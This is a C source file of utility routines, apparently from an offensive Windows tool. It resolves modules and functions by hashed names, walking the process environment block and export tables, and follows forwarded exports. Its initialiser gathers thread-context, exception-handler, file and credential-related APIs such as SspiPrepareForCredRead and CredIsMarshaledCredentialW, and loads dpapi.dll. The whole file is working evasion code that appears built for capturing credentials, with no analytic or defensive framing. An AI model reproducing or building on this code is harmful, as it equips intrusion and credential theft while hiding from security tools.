#include "utils.h"

FUNC ULONG HashString(PVOID String, SIZE_T Length, char* Extension) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr = { 0 };
    UCHAR  Char = { 0 };

    if (!String) {
        return 0;
    }

    Hash = 1337;
    Ptr = ((UCHAR*)(void*)String);

    while (1) {
        Char = *Ptr;

        if (!Length) {
            if (!*Ptr) break;
        }
        else {
            if (U_PTR(Ptr - U_PTR(String)) >= Length) break;
            if (!*Ptr) { ++Ptr; continue ; }
        }

        if (Char >= 'a') {
            Char -= 0x20;
        }
        Hash = ((Hash << 5) + Hash) + Char;
        ++Ptr;

    };

    if (Extension) {
        Ptr = (UCHAR*)(void*)Extension;
        while (1) {
            Char = *Ptr;
            if (!*Ptr) { break; }

            if (Char >= 'a') { Char -= 0x20; }
            Hash = ((Hash << 5) + Hash) + Char;
            ++Ptr;
        };
    }

    return Hash;
}

FUNC VOID* GetModuleHandleC(ULONG lpModuleName_hash) {
    CW32_PPEB pPEB = { 0 };

    pPEB = (CW32_PPEB)__readgsqword(0x60);
    CW32_PPEB_LDR_DATA pPEBLdr = pPEB->Ldr;

    for (CW32_PLDR_DATA_TABLE_ENTRY pLdeTmp = (CW32_PLDR_DATA_TABLE_ENTRY)pPEBLdr->InLoadOrderModuleList.Flink;
        pLdeTmp->DllBase != NULL; pLdeTmp = (CW32_PLDR_DATA_TABLE_ENTRY)pLdeTmp->InLoadOrderLinks.Flink) {
        ULONG Buffer_hash = HashString(pLdeTmp->BaseDllName.Buffer, pLdeTmp->BaseDllName.Length, NULL);
        if (lpModuleName_hash == Buffer_hash) {
            return pLdeTmp->DllBase;
        }
    }
    return 0;
}

FUNC SIZE_T StringLengthA(LPCSTR String) {
    LPCSTR String2 = NULL;

    if (String == NULL)
    return 0;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

FUNC PVOID GetProcAddressC(void* hModule, ULONG FunctionHash) {
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS  ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)dosHeaders + dosHeaders->e_lfanew);
    PIMAGE_DATA_DIRECTORY dataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    ULONG Idx = 0;
    if (dataDirectory->VirtualAddress) {
        PIMAGE_EXPORT_DIRECTORY exportsDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)dosHeaders + dataDirectory->VirtualAddress);
        PUINT32 addressOfNames = (PUINT32)((ULONG_PTR)dosHeaders + exportsDirectory->AddressOfNames);
        PUINT32 addressOfFunctions = (PUINT32)((ULONG_PTR)dosHeaders + exportsDirectory->AddressOfFunctions);
        PUINT16 addressOfOrdinals = (PUINT16)((ULONG_PTR)dosHeaders + exportsDirectory->AddressOfNameOrdinals);
        for (Idx = 0; Idx < exportsDirectory->NumberOfNames; ++Idx) {
            if (HashString((PVOID)((ULONG_PTR)dosHeaders + addressOfNames[Idx]), StringLengthA((LPCSTR)((ULONG_PTR)dosHeaders + addressOfNames[Idx])), NULL) == FunctionHash) {
                if ((addressOfFunctions[addressOfOrdinals[Idx]] >= dataDirectory->VirtualAddress) && (addressOfFunctions[addressOfOrdinals[Idx]] < dataDirectory->VirtualAddress + dataDirectory->Size)) {
                    char* forwarded_dll = (char*)((ULONG_PTR)dosHeaders + addressOfFunctions[addressOfOrdinals[Idx]]);
                    char* export_name = forwarded_dll;
                    char* dll_name = forwarded_dll;
                    while (*export_name != '.') {
                        if (*export_name == '\0') {
                            return NULL;
                        }
                        export_name++;
                    }
                    size_t dll_name_length = export_name - forwarded_dll;
                    export_name++;
                    SIZE_T ExportNameSize = StringLengthA(export_name);
                    ULONG dll_hash = HashString(dll_name, dll_name_length, (char[]){'.','d','l','l','\0'});
                    ULONG export_hash = HashString(export_name, ExportNameSize, NULL);
                    HANDLE export_dll_module = GetModuleHandleC(dll_hash);
                    return (PVOID)GetProcAddressC(export_dll_module, export_hash);
                }
                return (PVOID)((ULONG_PTR)dosHeaders + addressOfFunctions[addressOfOrdinals[Idx]]);
            }
        }
    }
    return NULL;
}

FUNC int InitializeApis() {
    MAIN_INSTANCE

    kernel32_handle = GetModuleHandleC(HASH_kernel32);
    ntdll_handle = GetModuleHandleC(HASH_ntdll);
    SspiCli_handle = GetModuleHandleC(HASH_SspiCli);
    Advapi32_handle = GetModuleHandleC(HASH_Advapi32);
    crypt32_handle = GetModuleHandleC(HASH_crypt32);
    msvcrt_handle = GetModuleHandleC(HASH_msvcrt);
    LoadLibraryA_ = GetProcAddressC(kernel32_handle, HASH_LoadLibraryA);
    LocalAlloc_ = GetProcAddressC(kernel32_handle, HASH_LocalAlloc);
    GetCurrentThreadId_ = GetProcAddressC(kernel32_handle, HASH_GetCurrentThreadId);
    OpenThread_ = GetProcAddressC(kernel32_handle, HASH_OpenThread);
    GetThreadContext_ = GetProcAddressC(kernel32_handle, HASH_GetThreadContext);
    SetThreadContext_ = GetProcAddressC(kernel32_handle, HASH_SetThreadContext);
    LocalFree_ = GetProcAddressC(kernel32_handle, HASH_LocalFree);
    GetCurrentProcessId_ = GetProcAddressC(kernel32_handle, HASH_GetCurrentProcessId);
    CloseHandle_ = GetProcAddressC(kernel32_handle, HASH_CloseHandle);
    ReadFile_ = GetProcAddressC(kernel32_handle, HASH_ReadFile);
    LeaveCriticalSection_ = GetProcAddressC(kernel32_handle, HASH_LeaveCriticalSection);
    InitializeCriticalSection_ = GetProcAddressC(kernel32_handle, HASH_InitializeCriticalSection);
    AddVectoredExceptionHandler_ = GetProcAddressC(kernel32_handle, HASH_AddVectoredExceptionHandler);
    EnterCriticalSection_ = GetProcAddressC(kernel32_handle, HASH_EnterCriticalSection);
    RemoveVectoredExceptionHandler_ = GetProcAddressC(kernel32_handle, HASH_RemoveVectoredExceptionHandler);
    DeleteCriticalSection_ = GetProcAddressC(kernel32_handle, HASH_DeleteCriticalSection);
    NtQuerySystemInformation_ = GetProcAddressC(ntdll_handle, HASH_NtQuerySystemInformation);
    snwprintf_s = GetProcAddressC(msvcrt_handle, HASH__snwprintf_s);
    CreateFileW_ = GetProcAddressC(kernel32_handle, HASH_CreateFileW);
    wcslen_ = GetProcAddressC(msvcrt_handle, HASH_wcslen);
    WriteFile_ = GetProcAddressC(kernel32_handle, HASH_WriteFile);

    SspiPrepareForCredRead_ = GetProcAddressC(SspiCli_handle, HASH_SspiPrepareForCredRead);
    CredIsMarshaledCredentialW_ = GetProcAddressC(Advapi32_handle, HASH_CredIsMarshaledCredentialW);

    LoadLibraryA_("dpapi.dll");

    CryptProtectMemory_ = GetProcAddressC(crypt32_handle, HASH_CryptProtectMemory);

    return 0;
}
